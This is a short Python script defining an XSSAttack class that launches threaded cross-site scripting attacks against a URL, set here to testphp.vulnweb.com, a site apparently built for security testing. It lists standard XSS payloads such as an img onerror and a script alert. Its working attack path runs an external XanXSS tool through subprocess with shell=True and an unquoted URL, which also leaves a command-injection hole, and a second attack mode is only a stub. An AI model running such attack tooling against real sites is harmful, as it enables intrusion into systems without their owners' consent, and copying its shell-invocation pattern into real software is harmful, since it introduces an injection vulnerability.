import requests
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import threading

logging.basicConfig(level=logging.INFO)


class XSSAttack:
    def __init__(self, url, num_attacks=1, attack_type="xanxxs"):
        self.url = url
        self.session = requests.Session()
        self.payloads = [
            "<vulnerable>test</vulnerable>",
            "<img src=x onerror=alert(1)>",
            "<script>alert(1);</script>",
        ]
        self.threads = []
        self.num_attacks = num_attacks
        self.attack_type = attack_type

    def create_attacks(self):
        for _ in range(self.num_attacks):
            thread = threading.Thread(target=self.run_attack)
            self.threads.append(thread)
            thread.start()

    def run_attack(self):
        if self.attack_type == "xanxxs":
            self.xanxxs_attack()
        elif self.attack_type == "b33f":
            self.b33f_attack()
        else:
            logging.error(f"Unknown attack type: {self.attack_type}")

    def xanxxs_attack(self):
        command = f"python3 XanXSS/xanxss.py -u {self.url}"
        import subprocess
        subprocess.run(command, shell=True)
        
        

    def b33f_attack(self):
        # TODO: Implement the b33f attack here
        raise NotImplementedError

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


# Target URL
target_url = "http://testphp.vulnweb.com"

# Create and launch attack
attack = XSSAttack(target_url, num_attacks=1, attack_type="xanxxs")
attack.create_attacks()
attack.wait_for_threads()
